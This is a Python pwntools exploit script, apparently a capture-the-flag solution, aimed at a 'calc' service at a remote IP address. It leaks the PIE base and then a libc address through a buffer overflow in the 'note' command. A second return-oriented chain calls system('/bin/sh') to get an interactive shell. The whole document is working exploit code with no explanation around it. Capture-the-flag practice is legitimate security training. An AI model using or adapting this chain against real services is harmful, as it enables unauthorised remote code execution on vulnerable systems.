from pwn import *
#io = process("./calc")
io = remote("13.125.200.127",8888)
libc = ELF("./libc.so.6")

io.sendlineafter("command>","calc")
io.sendlineafter("Formula>","A")

io.recvuntil("Result> ")
pieBase = int(io.recvline()[:-1]) - 5951

log.info("PIE BASE: " + hex(pieBase))


putsPlt = p64(pieBase + 0x10e0)
entry = p64(pieBase + 0x1180)

rop = b"A" * 56 + putsPlt + entry 
io.sendlineafter("command>","note")
io.sendlineafter("Note>",rop)

io.recvline()
libc.address = u64(io.recv(6).ljust(8,b"\x00")) - libc.symbols["funlockfile"]

log.info("LIBC BASE: " + hex(libc.address))

popRdi = p64(libc.address + 0x2a3e5)
ret = p64(pieBase + 0x1be9)

rop2 = b"A"*56 + ret + popRdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])
io.sendlineafter("command>","note")
io.sendlineafter("Note>",rop2)
io.interactive()
